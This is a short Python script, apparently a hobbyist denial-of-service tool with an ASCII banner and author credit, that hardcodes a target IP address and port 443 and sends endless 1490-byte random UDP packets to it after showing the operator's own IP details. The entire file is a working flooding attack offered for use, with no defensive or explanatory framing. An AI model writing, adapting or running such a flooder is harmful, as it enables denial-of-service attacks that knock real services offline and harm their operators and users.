import random

#################
ip = "188.114.97.2"
port = 443
#################

banner = """
      ┏━━━┓┏━━━┓┏━━━┓┏━━━┓┏━━━┓
      ┃┏━┓┃┃┏━┓┃┃┏━┓┃┃┏━┓┃┃┏━┓┃
      ┃┃━┃┃┃┗━━┓┃┃━┗┛┃┃━┃┃┃┗━┛┃
      ┃┃━┃┃┗━━┓┃┃┃━┏┓┃┗━┛┃┃┏┓┏┛
      ┃┗━┛┃┃┗━┛┃┃┗━┛┃┃┏━┓┃┃┃┃┗┓
      ┗━━━┛┗━━━┛┗━━━┛┗┛━┗┛┗┛┗━┛
          SouceCode : The Gang's (OscarTH)
          Facebook  : https://fb.com/MsreYazTV123
"""

def socket_run():
	import socket; import os; import requests
	os.system('clear')
	print(banner)
	print()
	input(' PLEASE ENTER TO STARTING..')
	print()
	print('                  ------- INFO -------')
	print()
	res = requests.get('https://ipinfo.io/json').json()
	ip_address = res['ip']
	hostname = res['hostname']
	city = res['city']
	print('    IP Address : ' + ip_address)
	print('    Hostname   : ' + hostname)
	print('    City       : ' + city)
	print()
	print("  WORKING...")
	
	while True:
		bs = random._urandom(1490)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(bs, (ip,port))
		
		#print(f"OSCAR THREADS : ",g)

def module_checker():
	try:
		import socket; import os
	except ImportError:
		os.system("clear")
		os.system("pip install socket")

module_checker()

if __name__ == '__main__':
	socket_run()
